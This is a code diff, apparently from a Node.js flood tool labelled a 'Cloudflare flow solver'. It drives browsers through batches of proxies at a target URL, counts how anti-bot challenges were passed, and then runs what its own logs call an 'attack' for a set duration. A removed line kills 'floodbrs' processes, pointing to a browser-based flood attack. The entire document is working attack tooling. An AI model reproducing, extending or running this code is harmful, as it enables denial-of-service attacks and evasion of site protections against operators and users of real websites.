+    coloredLog(COLORS.GREEN, `[START] Flow-based Cloudflare solver with ${proxies.length} proxies`);
     
-    proxies.forEach(proxy => {
-        queue.push({ browserProxy: proxy });
-    });
-
-    setTimeout(() => {
-        coloredLog(COLORS.YELLOW, '[INFO] Time limit reached, shutting down...');
-        queue.kill();
+    const results = {
+        success: 0,
+        failed: 0,
+        methods: {},
+        avgWaitTime: 0,
+        totalWaitTime: 0
+    };
+    
+    const concurrency = 2;
+    const delayBetweenBatches = 15000;
+    
+    for (let i = 0; i < proxies.length; i += concurrency) {
+        const batch = proxies.slice(i, i + concurrency);
+        coloredLog(COLORS.CYAN, `[BATCH] Processing ${i + 1}-${i + batch.length} of ${proxies.length}`);
         
-        exec('pkill -f "node.*floodbrs"', () => {
-            coloredLog(COLORS.GREEN, '[INFO] Cleanup completed');
-            process.exit(0);
+        const batchPromises = batch.map((proxy, batchIndex) => 
+            launchBrowser(targetURL, proxy, i + batchIndex + 1, proxies.length)
+        );
+        
+        const batchResults = await Promise.all(batchPromises);
+        
+        batchResults.forEach(result => {
+            if (result.success) {
+                results.success++;
+                results.methods[result.method] = (results.methods[result.method] || 0) + 1;
+                results.totalWaitTime += result.totalWaitTime || 0;
+            } else {
+                results.failed++;
+            }
         });
-    }, duration * 1000);
+        
+        coloredLog(COLORS.WHITE, `[STATUS] Success: ${results.success}, Failed: ${results.failed}`);
+        
+        if (i + concurrency < proxies.length) {
+            coloredLog(COLORS.CYAN, `[BATCH] Waiting ${delayBetweenBatches/1000}s...`);
+            await sleep(delayBetweenBatches);
+        }
+    }
+    
+    // Final report
+    results.avgWaitTime = results.success > 0 ? Math.round(results.totalWaitTime / results.success) : 0;
+    
+    coloredLog(COLORS.GREEN, `[FINAL] Completed: ${results.success}/${proxies.length} successful (${((results.success/proxies.length)*100).toFixed(1)}%)`);
+    coloredLog(COLORS.CYAN, `[TIMING] Average solve time: ${results.avgWaitTime}ms`);
+    coloredLog(COLORS.CYAN, `[METHODS] ${JSON.stringify(results.methods, null, 2)}`);
+    
+    coloredLog(COLORS.YELLOW, `[ATTACK] Running for ${duration} seconds...`);
+    await sleep(duration * 1000);
+    coloredLog(COLORS.YELLOW, '[SHUTDOWN] Attack completed');
 };
 
-// ========== ERROR HANDLING ==========
-process.on('uncaughtException', (error) => {
-    coloredLog(COLORS.RED, `[FATAL] Uncaught Exception: ${error.message}`);
+process.on('SIGINT', () => {
+    coloredLog(COLORS.YELLOW, '[INFO] Stopping gracefully...');
+    process.exit(0);
 });
 
-process.on('unhandledRejection', (error) => {
-    coloredLog(COLORS.RED, `[FATAL] Unhandled Rejection: ${error.message}`);
-});
-
-// ========== START APPLICATION ==========
-coloredLog(COLORS.GREEN, '[INFO] Starting browser automation...');
+coloredLog(COLORS.GREEN, '[READY] 🚀 CLOUDFLARE FLOW SOLVER STARTED 🚀');
 main().catch(err => {
-    coloredLog(COLORS.RED, `[FATAL] Main execution failed: ${err.message}`);
-    process.exit(1);
+    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
 });
